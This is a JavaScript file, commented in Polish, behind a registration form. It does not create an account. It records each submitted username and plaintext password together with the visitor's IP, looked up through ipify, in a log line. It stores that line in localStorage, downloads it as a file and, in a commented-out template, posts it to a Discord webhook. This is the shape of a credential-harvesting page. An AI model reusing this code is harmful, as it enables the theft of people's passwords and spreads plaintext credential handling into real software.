document.getElementById('registrationForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    const messageDiv = document.getElementById('message');
    const loadingDiv = document.getElementById('loading');
    
    // Resetowanie komunikatów
    messageDiv.style.display = 'none';
    messageDiv.className = 'message';
    
    // Walidacja
    if (password !== confirmPassword) {
        showMessage('Hasła nie są identyczne!', 'error');
        return;
    }
    
    if (username.length < 3) {
        showMessage('Nazwa użytkownika musi mieć co najmniej 3 znaki!', 'error');
        return;
    }
    
    if (password.length < 6) {
        showMessage('Hasło musi mieć co najmniej 6 znaków!', 'error');
        return;
    }
    
    // Rozpoczęcie procesu rejestracji
    loadingDiv.style.display = 'block';
    
    try {
        await registerUser(username, password);
    } catch (error) {
        console.error('Błąd rejestracji:', error);
        loadingDiv.style.display = 'none';
        showMessage('Błąd: ' + error.message, 'error');
    }
});

function showMessage(text, type) {
    const messageDiv = document.getElementById('message');
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
}

async function registerUser(username, password) {
    const loadingDiv = document.getElementById('loading');
    
    try {
        // Pobieranie IP użytkownika
        let userIP = 'unknown';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                userIP = ipData.ip;
                console.log('Pobrane IP:', userIP);
            }
        } catch (ipError) {
            console.log('Nie udało się pobrać IP, używam unknown');
        }

        // Tworzenie logu
        const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
        const version = '2.0';
        const logEntry = `${timestamp} | User: ${username}| Password: ${password} | IP: ${userIP} | Version: ${version}\n`;
        
        console.log('Log entry:', logEntry);
        
        // Wysyłanie logu do Webhook lub zapis lokalny
        await saveLogToService(logEntry);
        
        loadingDiv.style.display = 'none';
        showMessage('Rejestracja zakończona pomyślnie! Log został zapisany.', 'success');
        document.getElementById('registrationForm').reset();
        
    } catch (error) {
        console.error('Błąd rejestracji:', error);
        loadingDiv.style.display = 'none';
        showMessage('Błąd podczas zapisywania logu.', 'error');
    }
}

async function saveLogToService(logEntry) {
    // OPCJA 1: Zapis do localStorage (działa zawsze)
    saveToLocalStorage(logEntry);
    
    // OPCJA 2: Webhook do Discord/Email/Google Forms
    await sendToWebhook(logEntry);
    
    // OPCJA 3: Pobieranie pliku z logiem
    downloadLogFile(logEntry);
}

function saveToLocalStorage(logEntry) {
    try {
        // Pobierz istniejące logi lub utwórz nową tablicę
        const existingLogs = JSON.parse(localStorage.getItem('userLogs') || '[]');
        
        // Dodaj nowy log
        existingLogs.push({
            log: logEntry,
            timestamp: new Date().toISOString()
        });
        
        // Zapisz z powrotem do localStorage
        localStorage.setItem('userLogs', JSON.stringify(existingLogs));
        
        console.log('Zapisano w localStorage. Wszystkie logi:', existingLogs);
    } catch (error) {
        console.error('Błąd zapisu do localStorage:', error);
    }
}

async function sendToWebhook(logEntry) {
    // Tutaj możesz dodać webhook do Discord, Email, lub innej usługi
    // Przykład dla Discord Webhook:
    /*
    const webhookURL = 'https://discord.com/api/webhooks/...';
    
    try {
        await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `📝 Nowa rejestracja:\n\`\`\`${logEntry}\`\`\``
            })
        });
    } catch (error) {
        console.log('Webhook nie działa, kontynuuję...');
    }
    */
}

function downloadLogFile(logEntry) {
    // Tworzy i pobiera plik z logiem
    const blob = new Blob([logEntry], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `log_${Date.now()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// Funkcja do wyświetlania zapisanych logów (dla debugowania)
function showStoredLogs() {
    const logs = JSON.parse(localStorage.getItem('userLogs') || '[]');
    console.log('Zapisane logi:', logs);
    return logs;
}

// Funkcja do czyszczenia logów
function clearStoredLogs() {
    localStorage.removeItem('userLogs');
    console.log('Logi wyczyszczone');
}